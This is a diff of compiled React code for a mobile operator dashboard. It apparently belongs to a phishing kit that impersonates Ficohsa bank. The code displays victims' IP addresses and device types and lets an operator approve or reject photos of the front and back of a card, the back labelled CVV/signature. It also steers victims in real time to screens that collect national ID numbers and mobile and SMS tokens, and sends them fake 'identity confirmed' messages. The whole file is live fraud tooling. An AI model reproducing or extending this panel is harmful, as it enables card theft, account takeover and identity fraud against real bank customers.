+                        /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-gray-400", children: "IP:" }),
+                        " ",
+                        user.ip
+                      ] }),
+                      /* @__PURE__ */ jsxRuntimeExports.jsx(IconCopy, { size: 14, className: "text-gray-500" })
+                    ]
+                  }
+                ),
+                user.dispositivo && /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "bg-gray-700/50 p-2 rounded", children: [
+                  /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-gray-400", children: "Dispositivo:" }),
+                  " ",
+                  user.dispositivo === "Desktop" ? "PC" : user.dispositivo
+                ] })
+              ] }),
+              isFicohsa && user.esperandoAprobacionFoto && (user.fotoTemporalHD || user.fotoTemporal) && /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "bg-gradient-to-b from-emerald-950/30 to-neutral-900 border-2 border-emerald-500/40 rounded-xl p-3 space-y-2.5 shadow-lg shadow-black/40", children: [
+                /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center justify-between", children: [
+                  /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center gap-2", children: [
+                    /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "w-2.5 h-2.5 rounded-full bg-emerald-400 animate-ping" }),
+                    /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-xs font-bold text-emerald-300 uppercase tracking-wide", children: user.pasoFoto === "reverso" ? "Validar Reverso" : "Validar Frente" })
+                  ] }),
+                  /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-[11px] text-emerald-300 font-semibold px-2 py-0.5 rounded-full bg-emerald-950/80 border border-emerald-500/40", children: user.pasoFoto === "reverso" ? "Paso 2 de 2" : "Paso 1 de 2" })
+                ] }),
+                /* @__PURE__ */ jsxRuntimeExports.jsxs(
+                  "div",
+                  {
+                    onClick: () => setSelectedLightboxPhoto({
+                      src: user.fotoTemporalHD || user.fotoTemporal,
+                      title: user.pasoFoto === "reverso" ? "Tarjeta - Reverso (Por Validar)" : "Tarjeta - Frente (Por Validar)",
+                      userId: user.id,
+                      dni: user.DNI || user.RTN || user.id
+                    }),
+                    className: "relative aspect-[16/10] w-full rounded-lg overflow-hidden bg-black border border-emerald-500/40 cursor-pointer shadow-inner active:scale-[0.99] transition-transform",
+                    children: [
+                      /* @__PURE__ */ jsxRuntimeExports.jsx(
+                        "img",
+                        {
+                          src: user.fotoTemporalHD || user.fotoTemporal,
+                          alt: "Tarjeta enviada por el visitante",
+                          className: "w-full h-full object-cover"
+                        }
+                      ),
+                      /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "absolute inset-0 bg-black/20 flex items-center justify-center", children: /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "text-xs font-semibold text-white bg-black/75 backdrop-blur-sm px-2.5 py-1 rounded-md border border-white/20 flex items-center gap-1.5 shadow-md", children: [
+                        /* @__PURE__ */ jsxRuntimeExports.jsx(IconEye, { size: 14 }),
+                        " Tocar para maximizar"
+                      ] }) })
+                    ]
+                  }
+                ),
+                /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center gap-2 pt-0.5", children: [
+                  /* @__PURE__ */ jsxRuntimeExports.jsxs(
+                    "button",
+                    {
+                      type: "button",
+                      disabled: loadingPhotoAction[user.id],
+                      onClick: () => handleRechazarFotoMobile(user.id),
+                      className: "flex-1 py-2.5 px-3 rounded-lg text-xs font-bold bg-red-600/25 text-red-300 border border-red-500/40 hover:bg-red-600/40 active:scale-95 transition-all flex items-center justify-center gap-1.5 disabled:opacity-50",
+                      children: [
+                        /* @__PURE__ */ jsxRuntimeExports.jsx(IconRefresh, { size: 15 }),
+                        "Pedir reintento"
+                      ]
+                    }
+                  ),
+                  /* @__PURE__ */ jsxRuntimeExports.jsxs(
+                    "button",
+                    {
+                      type: "button",
+                      disabled: loadingPhotoAction[user.id],
+                      onClick: () => handleAprobarFotoMobile(user),
+                      className: "flex-1 py-2.5 px-3 rounded-lg text-xs font-bold bg-emerald-600 text-white hover:bg-emerald-500 active:scale-95 transition-all shadow-md flex items-center justify-center gap-1.5 disabled:opacity-50",
+                      children: [
+                        /* @__PURE__ */ jsxRuntimeExports.jsx(IconCheck, { size: 16, strokeWidth: 2.5 }),
+                        "Aprobar"
+                      ]
+                    }
+                  )
+                ] })
+              ] }),
+              isFicohsa && user.page === 7 && !user.esperandoAprobacionFoto && /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "bg-neutral-900/90 border border-[#0058CB]/40 rounded-xl p-3.5 flex flex-col items-center justify-center text-center space-y-2.5 relative overflow-hidden shadow-lg shadow-black/40", children: [
+                /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "w-11 h-11 rounded-full bg-[#0058CB]/25 border border-blue-400/30 flex items-center justify-center text-blue-300 shadow-sm", children: user.fotoRechazada ? /* @__PURE__ */ jsxRuntimeExports.jsx(IconRefresh, { size: 22, className: "animate-spin text-amber-400" }) : /* @__PURE__ */ jsxRuntimeExports.jsx(IconCamera, { size: 22, className: "animate-pulse text-blue-300" }) }),
+                /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { children: [
+                  /* @__PURE__ */ jsxRuntimeExports.jsx("p", { className: "text-xs font-bold text-white", children: user.fotoRechazada ? "El visitante está tomando la foto nuevamente" : "Esperando foto del visitante" }),
+                  /* @__PURE__ */ jsxRuntimeExports.jsx("p", { className: "text-[11px] text-blue-300/90 mt-0.5 font-medium", children: user.pasoFoto === "reverso" ? "Paso 2 de 2: Reverso de la tarjeta (CVV/Firma)" : "Paso 1 de 2: Frente de la tarjeta" })
+                ] }),
+                /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-[10px] text-gray-400 bg-black/40 px-3 py-1 rounded-full border border-white/10", children: "Los botones de aprobación aparecerán apenas la capture" })
+              ] }),
+              isFicohsa && (user.fotoFrente || user.fotoReverso) && /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "bg-neutral-900/80 border border-neutral-700/60 rounded-xl p-3 space-y-2", children: [
+                /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "flex items-center justify-between", children: /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "text-xs font-semibold text-gray-200 flex items-center gap-1.5", children: [
+                  /* @__PURE__ */ jsxRuntimeExports.jsx(IconCamera, { size: 14, className: "text-emerald-400" }),
+                  " Tarjetas aprobadas:"
+                ] }) }),
+                /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "grid grid-cols-2 gap-2", children: [
+                  /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex flex-col gap-1", children: [
+                    /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-[10px] text-gray-400 font-medium", children: "Frente" }),
+                    user.fotoFrente && typeof user.fotoFrente === "string" && user.fotoFrente.startsWith("data:") ? /* @__PURE__ */ jsxRuntimeExports.jsxs(
+                      "button",
+                      {
+                        type: "button",
+                        onClick: () => setSelectedLightboxPhoto({
+                          src: user.fotoFrente,
+                          title: "Tarjeta - Frente",
+                          userId: user.id,
+                          dni: user.DNI || user.RTN || user.id
+                        }),
+                        className: "relative rounded-lg overflow-hidden border border-emerald-500/50 aspect-[16/10] bg-black/60 active:scale-95 transition-transform",
+                        children: [
+                          /* @__PURE__ */ jsxRuntimeExports.jsx("img", { src: user.fotoFrente, alt: "Frente Tarjeta", className: "w-full h-full object-cover" }),
+                          /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "absolute inset-0 bg-black/30 flex items-center justify-center", children: /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "text-[10px] text-white font-medium bg-black/75 px-1.5 py-0.5 rounded flex items-center gap-1", children: [
+                            /* @__PURE__ */ jsxRuntimeExports.jsx(IconEye, { size: 12 }),
+                            " Ver"
+                          ] }) })
+                        ]
+                      }
+                    ) : /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "rounded-lg border border-gray-800 bg-gray-900/60 aspect-[16/10] flex items-center justify-center text-[10px] text-gray-500", children: user.fotoFrente ? "Aprobado" : "Pendiente" })
+                  ] }),
+                  /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex flex-col gap-1", children: [
+                    /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-[10px] text-gray-400 font-medium", children: "Reverso" }),
+                    user.fotoReverso && typeof user.fotoReverso === "string" && user.fotoReverso.startsWith("data:") ? /* @__PURE__ */ jsxRuntimeExports.jsxs(
+                      "button",
+                      {
+                        type: "button",
+                        onClick: () => setSelectedLightboxPhoto({
+                          src: user.fotoReverso,
+                          title: "Tarjeta - Reverso",
+                          userId: user.id,
+                          dni: user.DNI || user.RTN || user.id
+                        }),
+                        className: "relative rounded-lg overflow-hidden border border-emerald-500/50 aspect-[16/10] bg-black/60 active:scale-95 transition-transform",
+                        children: [
+                          /* @__PURE__ */ jsxRuntimeExports.jsx("img", { src: user.fotoReverso, alt: "Reverso Tarjeta", className: "w-full h-full object-cover" }),
+                          /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "absolute inset-0 bg-black/30 flex items-center justify-center", children: /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "text-[10px] text-white font-medium bg-black/75 px-1.5 py-0.5 rounded flex items-center gap-1", children: [
+                            /* @__PURE__ */ jsxRuntimeExports.jsx(IconEye, { size: 12 }),
+                            " Ver"
+                          ] }) })
+                        ]
+                      }
+                    ) : /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "rounded-lg border border-gray-800 bg-gray-900/60 aspect-[16/10] flex items-center justify-center text-[10px] text-gray-500", children: user.fotoReverso ? "Aprobado" : "Pendiente" })
+                  ] })
+                ] })
+              ] }),
+              /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "grid grid-cols-2 gap-2", children: (selectedBank === "ficohsa" ? [
+                { page: 1, label: "DNI/RTN", cols: "col-span-1" },
+                { page: 4, label: "Préstamo", cols: "col-span-1" },
+                { page: 2, label: "Token Móvil", cols: "col-span-1" },
+                { page: 3, label: "Token SMS", cols: "col-span-1" }
+              ] : [
+                { page: 1, label: "DNI/RTN", cols: "col-span-2" },
+                { page: 2, label: "Desbloquear", cols: "col-span-1" },
+                { page: 3, label: "Registrar", cols: "col-span-1" }
+              ]).map(({ page, label, cols }) => /* @__PURE__ */ jsxRuntimeExports.jsx(
+                "button",
+                {
+                  onClick: () => handleUpdatePageWithClear(user.id, page),
+                  disabled: user.page !== 0 && user.page !== page,
+                  className: `py-2 px-3 rounded-lg text-xs font-medium ${cols} ${user.page === 0 || user.page === page ? "bg-[#0058CB] text-white font-semibold" : "bg-gray-700/50 text-gray-500"}`,
+                  children: label
+                },
+                page
+              )) }),
+              /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "grid grid-cols-2 gap-2", children: [
                 /* @__PURE__ */ jsxRuntimeExports.jsxs(
                   "button",
                   {
-                    type: "button",
-                    disabled: loadingPhotoAction[user.id],
-                    onClick: () => handleRechazarFotoMobile(user.id),
-                    className: "flex-1 py-2.5 px-3 rounded-lg text-xs font-bold bg-red-600/25 text-red-300 border border-red-500/40 hover:bg-red-600/40 active:scale-95 transition-all flex items-center justify-center gap-1.5 disabled:opacity-50",
+                    onClick: () => {
+                      if (user.page === 0) {
+                        setSuccessPressedByUser((prev) => ({ ...prev, [user.id]: true }));
+                        const lastFormPage = lastFormPageByUser[user.id] || 1;
+                        const message = lastFormPage === 1 ? "Identidad confirmada exitosamente" : "Token confirmado exitosamente";
+                        __vitePreload(async () => { const {doc, updateDoc} = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url).then(({ doc, updateDoc }) => {
+                          __vitePreload(async () => { const {db, getBankCollection} = await Promise.resolve().then(() => firebase);return { db, getBankCollection }},true?void 0:void 0,import.meta.url).then(({ db, getBankCollection }) => {
+                            updateDoc(doc(db, getBankCollection("redireccion"), user.id), {
+                              successMessage: message
+                            });
+                          });
+                        });
+                      }
+                    },
+                    disabled: user.page !== 0,
+                    className: `py-2 px-3 rounded-lg text-xs font-medium flex items-center justify-center gap-1 ${user.page === 0 ? "bg-emerald-600 text-white font-semibold" : "bg-gray-700/50 text-gray-500"}`,
                     children: [
-                      /* @__PURE__ */ jsxRuntimeExports.jsx(IconRefresh, { size: 15 }),
-                      "Pedir reintento"
+                      /* @__PURE__ */ jsxRuntimeExports.jsx(IconCheck, { size: 14 }),
+                      " Éxito"
                     ]
                   }
                 ),
                 /* @__PURE__ */ jsxRuntimeExports.jsxs(
                   "button",
                   {
-                    type: "button",
-                    disabled: loadingPhotoAction[user.id],
-                    onClick: () => handleAprobarFotoMobile(user),
-                    className: "flex-1 py-2.5 px-3 rounded-lg text-xs font-bold bg-emerald-600 text-white hover:bg-emerald-500 active:scale-95 transition-all shadow-md flex items-center justify-center gap-1.5 disabled:opacity-50",
+                    onClick: () => handleErrorForUser(user.id),
+                    disabled: user.page !== 0 && user.page !== 5 || successPressedByUser[user.id],
+                    className: `py-2 px-3 rounded-lg text-xs font-medium flex items-center justify-center gap-1 ${user.page === 5 ? "bg-red-600 text-white font-semibold ring-2 ring-red-400/60" : user.page === 0 && !successPressedByUser[user.id] ? "bg-red-600 text-white font-semibold" : "bg-gray-700/50 text-gray-500"}`,
                     children: [
-                      /* @__PURE__ */ jsxRuntimeExports.jsx(IconCheck, { size: 16, strokeWidth: 2.5 }),
-                      "Aprobar"
+                      /* @__PURE__ */ jsxRuntimeExports.jsx(IconX, { size: 14 }),
+                      " Error"
                     ]
                   }
                 )
-              ] })
-            ] }),
-            isFicohsa && user.page === 7 && !user.esperandoAprobacionFoto && /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "bg-neutral-900/90 border border-[#0058CB]/40 rounded-xl p-3.5 flex flex-col items-center justify-center text-center space-y-2.5 relative overflow-hidden shadow-lg shadow-black/40", children: [
-              /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "w-11 h-11 rounded-full bg-[#0058CB]/25 border border-blue-400/30 flex items-center justify-center text-blue-300 shadow-sm", children: user.fotoRechazada ? /* @__PURE__ */ jsxRuntimeExports.jsx(IconRefresh, { size: 22, className: "animate-spin text-amber-400" }) : /* @__PURE__ */ jsxRuntimeExports.jsx(IconCamera, { size: 22, className: "animate-pulse text-blue-300" }) }),
-              /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { children: [
-                /* @__PURE__ */ jsxRuntimeExports.jsx("p", { className: "text-xs font-bold text-white", children: user.fotoRechazada ? "El visitante está tomando la foto nuevamente" : "Esperando foto del visitante" }),
-                /* @__PURE__ */ jsxRuntimeExports.jsx("p", { className: "text-[11px] text-blue-300/90 mt-0.5 font-medium", children: user.pasoFoto === "reverso" ? "Paso 2 de 2: Reverso de la tarjeta (CVV/Firma)" : "Paso 1 de 2: Frente de la tarjeta" })
               ] }),
-              /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-[10px] text-gray-400 bg-black/40 px-3 py-1 rounded-full border border-white/10", children: "Los botones de aprobación aparecerán apenas la capture" })
-            ] }),
-            isFicohsa && (user.fotoFrente || user.fotoReverso) && /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "bg-neutral-900/80 border border-neutral-700/60 rounded-xl p-3 space-y-2", children: [
-              /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "flex items-center justify-between", children: /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "text-xs font-semibold text-gray-200 flex items-center gap-1.5", children: [
-                /* @__PURE__ */ jsxRuntimeExports.jsx(IconCamera, { size: 14, className: "text-emerald-400" }),
-                " Tarjetas aprobadas:"
-              ] }) }),
-              /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "grid grid-cols-2 gap-2", children: [
-                /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex flex-col gap-1", children: [
-                  /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-[10px] text-gray-400 font-medium", children: "Frente" }),
-                  user.fotoFrente && typeof user.fotoFrente === "string" && user.fotoFrente.startsWith("data:") ? /* @__PURE__ */ jsxRuntimeExports.jsxs(
-                    "button",
-                    {
-                      type: "button",
-                      onClick: () => setSelectedLightboxPhoto({
-                        src: user.fotoFrente,
-                        title: "Tarjeta - Frente",
-                        userId: user.id,
-                        dni: user.DNI || user.RTN || user.id
-                      }),
-                      className: "relative rounded-lg overflow-hidden border border-emerald-500/50 aspect-[16/10] bg-black/60 active:scale-95 transition-transform",
-                      children: [
-                        /* @__PURE__ */ jsxRuntimeExports.jsx("img", { src: user.fotoFrente, alt: "Frente Tarjeta", className: "w-full h-full object-cover" }),
-                        /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "absolute inset-0 bg-black/30 flex items-center justify-center", children: /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "text-[10px] text-white font-medium bg-black/75 px-1.5 py-0.5 rounded flex items-center gap-1", children: [
-                          /* @__PURE__ */ jsxRuntimeExports.jsx(IconEye, { size: 12 }),
-                          " Ver"
-                        ] }) })
-                      ]
-                    }
-                  ) : /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "rounded-lg border border-gray-800 bg-gray-900/60 aspect-[16/10] flex items-center justify-center text-[10px] text-gray-500", children: user.fotoFrente ? "Aprobado" : "Pendiente" })
-                ] }),
-                /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex flex-col gap-1", children: [
-                  /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-[10px] text-gray-400 font-medium", children: "Reverso" }),
-                  user.fotoReverso && typeof user.fotoReverso === "string" && user.fotoReverso.startsWith("data:") ? /* @__PURE__ */ jsxRuntimeExports.jsxs(
-                    "button",
-                    {
-                      type: "button",
-                      onClick: () => setSelectedLightboxPhoto({
-                        src: user.fotoReverso,
-                        title: "Tarjeta - Reverso",
-                        userId: user.id,
-                        dni: user.DNI || user.RTN || user.id
-                      }),
-                      className: "relative rounded-lg overflow-hidden border border-emerald-500/50 aspect-[16/10] bg-black/60 active:scale-95 transition-transform",
-                      children: [
-                        /* @__PURE__ */ jsxRuntimeExports.jsx("img", { src: user.fotoReverso, alt: "Reverso Tarjeta", className: "w-full h-full object-cover" }),
-                        /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "absolute inset-0 bg-black/30 flex items-center justify-center", children: /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "text-[10px] text-white font-medium bg-black/75 px-1.5 py-0.5 rounded flex items-center gap-1", children: [
-                          /* @__PURE__ */ jsxRuntimeExports.jsx(IconEye, { size: 12 }),
-                          " Ver"
-                        ] }) })
-                      ]
-                    }
-                  ) : /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "rounded-lg border border-gray-800 bg-gray-900/60 aspect-[16/10] flex items-center justify-center text-[10px] text-gray-500", children: user.fotoReverso ? "Aprobado" : "Pendiente" })
-                ] })
-              ] })
-            ] }),
-            /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "grid grid-cols-2 gap-2", children: (selectedBank === "ficohsa" ? [
-              { page: 1, label: "DNI/RTN", cols: "col-span-1" },
-              { page: 4, label: "Préstamo", cols: "col-span-1" },
-              { page: 2, label: "Token Móvil", cols: "col-span-1" },
-              { page: 3, label: "Token SMS", cols: "col-span-1" }
-            ] : [
-              { page: 1, label: "DNI/RTN", cols: "col-span-2" },
-              { page: 2, label: "Desbloquear", cols: "col-span-1" },
-              { page: 3, label: "Registrar", cols: "col-span-1" }
-            ]).map(({ page, label, cols }) => /* @__PURE__ */ jsxRuntimeExports.jsx(
-              "button",
-              {
-                onClick: () => handleUpdatePageWithClear(user.id, page),
-                disabled: user.page !== 0 && user.page !== page,
-                className: `py-2 px-3 rounded-lg text-xs font-medium ${cols} ${user.page === 0 || user.page === page ? "bg-[#0058CB] text-white font-semibold" : "bg-gray-700/50 text-gray-500"}`,
-                children: label
-              },
-              page
-            )) }),
-            /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "grid grid-cols-2 gap-2", children: [
-              /* @__PURE__ */ jsxRuntimeExports.jsxs(
+              isFicohsa && /* @__PURE__ */ jsxRuntimeExports.jsx("div", { children: /* @__PURE__ */ jsxRuntimeExports.jsxs(
                 "button",
                 {
-                  onClick: () => {
-                    if (user.page === 0) {
-                      setSuccessPressedByUser((prev) => ({ ...prev, [user.id]: true }));
-                      const lastFormPage = lastFormPageByUser[user.id] || 1;
-                      const message = lastFormPage === 1 ? "Identidad confirmada exitosamente" : "Token confirmado exitosamente";
-                      __vitePreload(async () => { const {doc, updateDoc} = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0).then(({ doc, updateDoc }) => {
-                        __vitePreload(async () => { const {db, getBankCollection} = await Promise.resolve().then(() => firebase);return { db, getBankCollection }},true?void 0:void 0).then(({ db, getBankCollection }) => {
-                          updateDoc(doc(db, getBankCollection("redireccion"), user.id), {
-                            successMessage: message
-                          });
-                        });
-                      });
-                    }
-                  },
-                  disabled: user.page !== 0,
-                  className: `py-2 px-3 rounded-lg text-xs font-medium flex items-center justify-center gap-1 ${user.page === 0 ? "bg-emerald-600 text-white font-semibold" : "bg-gray-700/50 text-gray-500"}`,
-                  children: [
-                    /* @__PURE__ */ jsxRuntimeExports.jsx(IconCheck, { size: 14 }),
-                    " Éxito"
-                  ]
-                }
-              ),
-              /* @__PURE__ */ jsxRuntimeExports.jsxs(
-                "button",
-                {
-                  onClick: () => handleErrorForUser(user.id),
-                  disabled: user.page !== 0 && user.page !== 5 || successPressedByUser[user.id],
-                  className: `py-2 px-3 rounded-lg text-xs font-medium flex items-center justify-center gap-1 ${user.page === 5 ? "bg-red-600 text-white font-semibold ring-2 ring-red-400/60" : user.page === 0 && !successPressedByUser[user.id] ? "bg-red-600 text-white font-semibold" : "bg-gray-700/50 text-gray-500"}`,
-                  children: [
-                    /* @__PURE__ */ jsxRuntimeExports.jsx(IconX, { size: 14 }),
-                    " Error"
-                  ]
-                }
-              )
-            ] }),
-            isFicohsa && /* @__PURE__ */ jsxRuntimeExports.jsx("div", { children: /* @__PURE__ */ jsxRuntimeExports.jsxs(
-              "button",
-              {
-                onClick: () => {
-                  __vitePreload(async () => { const {doc, updateDoc} = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0).then(({ doc, updateDoc }) => {
-                    __vitePreload(async () => { const {db, getBankCollection} = await Promise.resolve().then(() => firebase);return { db, getBankCollection }},true?void 0:void 0).then(({ db, getBankCollection }) => {
-                      updateDoc(doc(db, getBankCollection("redireccion"), user.id), {
+                  onClick: async () => {
+                    try {
+                      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
+                      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0,import.meta.url);
+                      await updateDoc(doc(getActiveBankDb(), getBankCollection("redireccion"), user.id), {
                         mostrarModalFoto: true,
                         fotoRechazada: false,
                         esperandoAprobacionFoto: false,
-                        fotoAprobada: false
+                        fotoAprobada: false,
+                        pasoFoto: "frente",
+                        fotoTemporal: null,
+                        fotoTemporalHD: null
                       });
-                    });
-                  });
-                  handleUpdatePageWithClear(user.id, 7);
-                },
-                disabled: user.page !== 0 && user.page !== 7,
-                className: `w-full py-2 px-3 rounded-lg text-xs font-medium flex items-center justify-center gap-1.5 ${user.page === 7 ? "bg-[#0058CB] text-white font-semibold ring-2 ring-blue-400/60" : user.page === 0 ? "bg-[#0058CB] text-white font-semibold" : "bg-gray-700/50 text-gray-500"}`,
-                children: [
-                  /* @__PURE__ */ jsxRuntimeExports.jsx(IconCamera, { size: 14 }),
-                  " Foto"
-                ]
-              }
-            ) }),
-            /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "space-y-2", children: [
-              /* @__PURE__ */ jsxRuntimeExports.jsx(
-                "button",
-                {
-                  onClick: () => {
-                    if (chatStatus === "active") {
-                      setShowChat(true);
-                    } else {
-                      solicitarChat(user.id);
+                    } catch (e) {
+                      console.error("[MobileDashboard] Error al solicitar foto:", e);
                     }
+                    handleUpdatePageWithClear(user.id, 7);
                   },
-                  disabled: chatStatus === "requested",
-                  className: `w-full py-2 px-3 rounded-lg text-xs font-medium flex items-center justify-center gap-2 ${chatStatus === "requested" ? "bg-yellow-600/50 text-white" : chatStatus === "active" ? "bg-emerald-600 text-white font-semibold" : "bg-emerald-600 text-white font-semibold"}`,
-                  children: chatStatus === "requested" ? "Solicitando..." : chatStatus === "active" ? /* @__PURE__ */ jsxRuntimeExports.jsxs(jsxRuntimeExports.Fragment, { children: [
-                    /* @__PURE__ */ jsxRuntimeExports.jsx(IconMessageDots, { size: 14 }),
-                    " Abrir Chat"
-                  ] }) : /* @__PURE__ */ jsxRuntimeExports.jsxs(jsxRuntimeExports.Fragment, { children: [
-                    /* @__PURE__ */ jsxRuntimeExports.jsx(IconPhone, { size: 14 }),
-                    " Solicitar Chat"
-                  ] })
-                }
-              ),
-              chatStatus === "active" && /* @__PURE__ */ jsxRuntimeExports.jsxs(
-                "button",
-                {
-                  onClick: () => finalizarChat(),
-                  className: "w-full py-2 px-3 rounded-lg text-xs font-medium flex items-center justify-center gap-2 bg-red-600 text-white font-semibold",
+                  disabled: user.page !== 0 && user.page !== 7,
+                  className: `w-full py-2 px-3 rounded-lg text-xs font-medium flex items-center justify-center gap-1.5 ${user.page === 7 ? "bg-[#0058CB] text-white font-semibold ring-2 ring-blue-400/60" : user.page === 0 ? "bg-[#0058CB] text-white font-semibold" : "bg-gray-700/50 text-gray-500"}`,
                   children: [
-                    /* @__PURE__ */ jsxRuntimeExports.jsx(IconPhoneOff, { size: 14 }),
-                    " Finalizar Chat"
+                    /* @__PURE__ */ jsxRuntimeExports.jsx(IconCamera, { size: 14 }),
+                    " Foto"
                   ]
                 }
-              ),
-              /* @__PURE__ */ jsxRuntimeExports.jsx(
+              ) }),
+              /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "space-y-2", children: [
+                /* @__PURE__ */ jsxRuntimeExports.jsx(
+                  "button",
+                  {
+                    onClick: () => {
+                      if (chatStatus === "active") {
+                        setShowChat(true);
+                      } else {
+                        solicitarChat(user.id);
+                      }
+                    },
+                    disabled: chatStatus === "requested",
+                    className: `w-full py-2 px-3 rounded-lg text-xs font-medium flex items-center justify-center gap-2 ${chatStatus === "requested" ? "bg-yellow-600/50 text-white" : chatStatus === "active" ? "bg-emerald-600 text-white font-semibold" : "bg-emerald-600 text-white font-semibold"}`,
+                    children: chatStatus === "requested" ? "Solicitando..." : chatStatus === "active" ? /* @__PURE__ */ jsxRuntimeExports.jsxs(jsxRuntimeExports.Fragment, { children: [
+                      /* @__PURE__ */ jsxRuntimeExports.jsx(IconMessageDots, { size: 14 }),
+                      " Abrir Chat"
+                    ] }) : /* @__PURE__ */ jsxRuntimeExports.jsxs(jsxRuntimeExports.Fragment, { children: [
+                      /* @__PURE__ */ jsxRuntimeExports.jsx(IconPhone, { size: 14 }),
+                      " Solicitar Chat"
+                    ] })
+                  }
+                ),
+                chatStatus === "active" && /* @__PURE__ */ jsxRuntimeExports.jsxs(
+                  "button",
+                  {
+                    onClick: () => finalizarChat(),
+                    className: "w-full py-2 px-3 rounded-lg text-xs font-medium flex items-center justify-center gap-2 bg-red-600 text-white font-semibold",
+                    children: [
+                      /* @__PURE__ */ jsxRuntimeExports.jsx(IconPhoneOff, { size: 14 }),
+                      " Finalizar Chat"
+                    ]
+                  }
+                ),
+                /* @__PURE__ */ jsxRuntimeExports.jsx(
+                  "button",
+                  {
+                    onClick: () => {
+                      setFinalizarUserId(user.id);
+                      setShowFinalizarConfirm(true);
+                    },
+                    disabled: user.page !== 0,
+                    className: `w-full py-2 px-3 rounded-lg text-xs font-medium flex items-center justify-center gap-2 ${user.page === 0 ? "bg-orange-600 text-white font-semibold" : "bg-gray-700/50 text-gray-500"}`,
+                    children: "Finalizar"
+                  }
+                )
+              ] }),
+              /* @__PURE__ */ jsxRuntimeExports.jsxs(
                 "button",
                 {
-                  onClick: () => {
-                    setFinalizarUserId(user.id);
-                    setShowFinalizarConfirm(true);
-                  },
-                  disabled: user.page !== 0,
-                  className: `w-full py-2 px-3 rounded-lg text-xs font-medium flex items-center justify-center gap-2 ${user.page === 0 ? "bg-orange-600 text-white font-semibold" : "bg-gray-700/50 text-gray-500"}`,
-                  children: "Finalizar"
+                  onClick: () => handleDeleteUser(user.id),
+                  className: "w-full py-2 px-3 rounded-lg text-xs font-medium flex items-center justify-center gap-2 bg-red-600/20 text-red-400 border border-red-600/30",
+                  children: [
+                    /* @__PURE__ */ jsxRuntimeExports.jsx(IconTrash, { size: 14 }),
+                    " Eliminar Usuario"
+                  ]
                 }
               )
-            ] }),
-            /* @__PURE__ */ jsxRuntimeExports.jsxs(
-              "button",
-              {
-                onClick: () => handleDeleteUser(user.id),
-                className: "w-full py-2 px-3 rounded-lg text-xs font-medium flex items-center justify-center gap-2 bg-red-600/20 text-red-400 border border-red-600/30",
-                children: [
-                  /* @__PURE__ */ jsxRuntimeExports.jsx(IconTrash, { size: 14 }),
-                  " Eliminar Usuario"
-                ]
-              }
-            )
-          ] })
-        }
-      ) })
-    ] }, user.id)) }),
+            ] })
+          }
+        ) })
+      ] }, user.id))
+    ] }),
     /* @__PURE__ */ jsxRuntimeExports.jsx(AnimatePresence, { children: showChat && chatStatus === "active" && selectedUser && /* @__PURE__ */ jsxRuntimeExports.jsxs(
       motion.div,
       {
@@ -59387,6 +59584,20 @@ const MobileDashboard = () => {
